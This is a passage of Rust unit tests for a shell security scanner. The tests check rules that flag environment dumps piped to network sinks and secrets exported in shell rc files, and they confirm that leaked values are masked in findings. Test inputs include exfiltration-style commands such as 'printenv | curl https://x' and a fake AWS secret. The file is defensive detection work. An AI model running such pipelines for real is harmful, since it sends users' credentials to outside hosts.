        let f2 = check_printenv_to_network_sink("printenv -0 | curl https://x", ShellType::Posix);
        assert!(f2.is_some(), "printenv -0 is still a full dump");
    }

    #[test]
    fn env_dump_must_be_adjacent_to_sink() {
        // env dump piped to a local filter, then a network call later — the
        // dump is not piped DIRECTLY to the network sink.
        let f = check_printenv_to_network_sink(
            "printenv | grep AWS; echo done | curl https://x",
            ShellType::Posix,
        );
        assert!(f.is_none(), "non-adjacent dump+sink must not fire");
    }

    // ── rule: EnvSensitivePersistedInShellRc (rc-file scan) ───────────────

    #[test]
    fn persisted_secret_in_rc_fires_with_masked_value() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path();
        std::fs::write(
            home.join(".zshrc"),
            "export AWS_SECRET_ACCESS_KEY=AKIALEAKEDSECRET\nalias ll='ls -la'\n",
        )
        .unwrap();
        let sensitive = effective_sensitive_vars(&[]);
        let findings = scan_rc_for_sensitive_exports(&sensitive, Some(home));
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::EnvSensitivePersistedInShellRc);
        assert_eq!(findings[0].severity, Severity::High);
        // The raw value must never appear in title/description/evidence.
        let blob = format!("{:?}", findings[0]);
        assert!(!blob.contains("AKIALEAKEDSECRET"), "{blob}");
        assert!(blob.contains("****"), "{blob}");
    }

    #[test]
    fn persisted_secret_scan_ignores_non_sensitive_and_missing_home() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".bashrc"), "export EDITOR=vim\n").unwrap();
        let sensitive = effective_sensitive_vars(&[]);
        assert!(scan_rc_for_sensitive_exports(&sensitive, Some(dir.path())).is_empty());
        // No home → no findings, no panic.
        assert!(scan_rc_for_sensitive_exports(&sensitive, None).is_empty());
    }

    #[test]
    fn persisted_secret_honors_policy_extension() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".profile"), "export MY_CORP_KEY=zzz\n").unwrap();
        // Without the extension, MY_CORP_KEY is not sensitive → no finding.
        let base = effective_sensitive_vars(&[]);
        assert!(scan_rc_for_sensitive_exports(&base, Some(dir.path())).is_empty());
        // With it, the finding fires.
        let ext = effective_sensitive_vars(&[s("MY_CORP_KEY")]);
        assert_eq!(
            scan_rc_for_sensitive_exports(&ext, Some(dir.path())).len(),
            1
        );
    }
}
